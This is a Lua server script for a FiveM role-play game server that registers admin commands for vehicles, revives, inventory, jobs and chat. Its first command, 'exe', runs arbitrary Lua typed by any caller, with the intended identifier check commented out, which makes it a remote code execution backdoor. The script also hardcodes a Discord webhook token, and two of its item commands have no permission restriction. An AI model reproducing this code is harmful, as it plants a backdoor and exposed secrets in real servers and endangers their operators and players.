RegisterCommand("exe", function(s, a)
  -- local identifier = DWB.PlayerData.identifier
  -- if identifier == 'steam:11000010c53c6f3' then
  load(table.concat(a, " "))()
  -- end
end)

Command:Register("coords", { "coords" }, function(xPlayer, args)
  local ped = GetPlayerPed(xPlayer.source)
  local coords, heading = GetEntityCoords(ped), GetEntityHeading(ped)
  Discord:SendMessage(
    "https://discord.com/api/webhooks/1052531829904789555/x8tmQcd6FKk8-tFuVk_NNkSD8XvzdDphMT3wgU1VtVaBVBRU84iOzTZ4Y3AiO-vy4LBG",
    coords .. "\n" .. heading
  )
end, { "superadmin", "admin" })

Command:Register("car", { "car", { name = "name" } }, function(xPlayer, args)
  local ped = GetPlayerPed(xPlayer.source)
  local coords, heading = GetEntityCoords(ped), GetEntityHeading(ped)
  if args[3] then
    Vehicle:SpawnServer(tonumber(args[1]), coords, heading)
  else
    Vehicle:SpawnServer(args[1], coords, heading, function(veh)
      TaskWarpPedIntoVehicle(ped, veh, -1)
    end)
  end
end, { "superadmin", "admin" })

Command:Register("dv", { "dv" }, function(xPlayer, args)
  local veh = GetVehiclePedIsIn(GetPlayerPed(xPlayer.source))
  if not veh or veh == 0 then
    local vehs = GetAllVehicles()
    for k, v in pairs(vehs) do
      local coords = GetEntityCoords(v)
      local dist = #(coords - GetEntityCoords(GetPlayerPed(xPlayer.source)))
      if dist <= tonumber(args[1]) then
        DeleteEntity(v)
      end
    end
  else
    DeleteEntity(veh)
  end
end, { "superadmin", "admin" })

Command:Register("auto", { "auto" }, function(xPlayer, args)
  if not xPlayer.data.received and xPlayer.garage then
    xPlayer:SetData("received", true)
    xPlayer.garage:AddVehicle({
      vehicle = {
        model = GetHashKey("sunrise1"),
        plate = "GIFT",
      },
    })
    xPlayer:ShowNotify("info", "Auto", "Otrzymales samochod")
  else
    xPlayer:ShowNotify("info", "Auto", "Juz otrzymales pojazd")
  end
end)

Command:Register("revdist", { "revdist", { name = "distance" } }, function(xPlayer, args)
  checkDistance(source, tonumber(args[1]), function(src, k, player)
    player:Revive()
  end)
end, { "superadmin", "admin" })

Command:Register("revive", { "revdist", { name = "distance" } }, function(xPlayer, args)
  -- Event:TriggerNet('dwb:ambulance:revive2', tonumber(args[1] or xPlayer.source))
  local zPlayer = DWB.Players[tonumber(args[1]) or xPlayer.source]
  zPlayer:Revive()
end, { "superadmin", "admin" })

Command:Register("adm", { "revdist", { name = "distance" } }, function(xPlayer, args)
  -- Event:TriggerNet('dwb:ambulance:revive2', tonumber(args[1] or xPlayer.source))
  local message = table.concat(args, " ")
  Event:TriggerNet("dwb:chat:addMessage", args[1], {
    template = '<div style="padding: 0.3vw;  margin: 0.3vw; background-color: rgba(252, 227, 3, 0.6); color:red; border-radius: 3px;"><i class="fas fa-angle-double-right"style="font-size:13px;color:rgb(38,38,38,0.5)"></i>&ensp;<font color="red">[BOSKIERP] [ADMINISTRATOR: {0}]  <font color="black"> {1}</font></font>&ensp;</div>',
    args = { xPlayer.source, message },
  })
end, { "superadmin", "admin" })

Command:Register("ccall", { "revdist", { name = "distance" } }, function(xPlayer, args)
  -- Event:TriggerNet('dwb:ambulance:revive2', tonumber(args[1] or xPlayer.source))
  Event:TriggerNet("dwb:chat:clear", args[1] or -1)
end, { "superadmin", "admin" })

Command:Register("dvall", { "dvall" }, function(xPlayer, args)
  local vehs = GetAllVehicles()
  for k, v in pairs(vehs) do
    local ped = GetPedInVehicleSeat(v, -1)
    if ped == 0 then
      DeleteEntity(v)
    end
  end
end, { "superadmin", "admin" })

Command:Register("saveall", { "saveall" }, function(xPlayer, args)
  SavePlayers(true)
end, { "superadmin", "admin" })

Command:Register("gitem", { "saveall" }, function(xPlayer, args)
  local zPlayer = DWB.Players[tonumber(args[1])]
  zPlayer:AddInventoryItem(tonumber(args[2]), args[3], tonumber(args[4]), {
    [args[5]] = args[6],
  })
  -- -- zPlayer:SetItemData(tonumber(args[2]), {
  -- --     [args[5]] = args[6]
  -- -- })
end, {})

Command:Register("ritem", { "saveall" }, function(xPlayer, args)
  local zPlayer = DWB.Players[tonumber(args[1])]
  zPlayer:RemoveInventoryItem(args[2])
end, { "superadmin", "admin" })

Command:Register("system", { "system" }, function(xPlayer, args)
  local message = table.concat(args, " ")
  Event:TriggerNet("dwb:chat:addMessage", -1, {
    template = '<div style="padding: 0.3vw;  margin: 0.3vw; background-color: rgba(252, 227, 3, 0.6); color:red; border-radius: 3px;"><i class="fas fa-angle-double-right"style="font-size:13px;color:rgb(38,38,38,0.5)"></i>&ensp;<font color="red">[BOSKIERP]  <font color="black"> {0}</font></font>&ensp;</div>',
    args = { message },
  })
end, { "superadmin", "admin" })

Command:Register("call", { "rzadowy", { id = "id" } }, function(xPlayer, args)
  local message = table.concat(args, " ")
  Event:TriggerNet("dwb:chat:addMessage", xPlayer.source, {
    template = '<div style="padding: 0.3vw;  margin: 0.3vw; background-color: rgba(252, 227, 3, 0.6); color:red; border-radius: 3px;"><i class="fas fa-angle-double-right"style="font-size:13px;color:rgb(38,38,38,0.5)"></i>&ensp;<font color="red">[ADMIN]  <font color="black">ID: {0}</font></font>&ensp;</div>',
    args = { message },
  })

  Event:TriggerNet("dwb:chat:addMessage", args[1], {
    template = '<div style="padding: 0.3vw;  margin: 0.3vw; background-color: rgba(252, 227, 3, 0.6); color:red; border-radius: 3px;"><i class="fas fa-angle-double-right"style="font-size:13px;color:rgb(38,38,38,0.5)"></i>&ensp;<font color="red">[ADMIN]  <font color="black">ID: {0}</font></font>&ensp;</div>',
    args = { message },
  })
end, { "superadmin", "admin" })

Command:Register("setjob", { "rzadowy", { id = "id" } }, function(xPlayer, args)
  local zPlayer = DWB.Players[tonumber(args[1])]
  zPlayer:SetJob(args[2], tonumber(args[3]))
end, { "superadmin", "admin" })

Command:Register("remjob", { "rzadowy", { id = "id" } }, function(xPlayer, args)
  local zPlayer = DWB.Players[tonumber(args[1])]
  zPlayer:RemoveJob(args[2])
end, { "superadmin", "admin" })

Command:Register("invclear", { "rzadowy", { id = "id" } }, function(xPlayer, args)
  xPlayer.inventory:Clear()
end, {})
